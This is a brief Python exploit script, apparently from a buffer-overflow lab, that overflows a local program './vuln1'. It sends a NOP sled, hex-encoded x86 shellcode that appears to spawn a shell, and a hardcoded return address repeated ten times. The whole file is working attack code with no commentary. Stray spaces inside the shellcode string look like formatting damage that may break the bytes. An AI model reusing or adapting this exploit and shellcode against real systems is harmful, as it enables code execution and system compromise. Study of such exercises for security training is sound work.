import struct
import subprocess

ret = 0xbffffd80
sc = "\xeb\x34\x5e\x89\xf7\x83\xef\x22\x31\xc9\xb1\x8c\xd1\xc9\xb0\x7b \xf2\xae\xff\xcf\xac\x28\x07\xe2\xf5\x89\x7b\x08\x91\x88\x7b\x07\x89 \x7b\x0c\xb0\x0b\x89\xf3\x8d\x7b\x08\x8d\x7b\x0c\xcd\x80\x31\xdb\x89 \xd8\x40\xcd\x80\xe8\xc7\xff\xff\xff\x05\x35\x35\x2d\x25\x19\x12\x0d \x08\x13/\x7b\x7b\x7b/\x7b\x7b"

buf = "\x90"*184                  # NOPs
buf += sc                         # Shellcode
buf += struct.pack("<I", ret)*10  # return address

subprocess.call(["./vuln1", buf])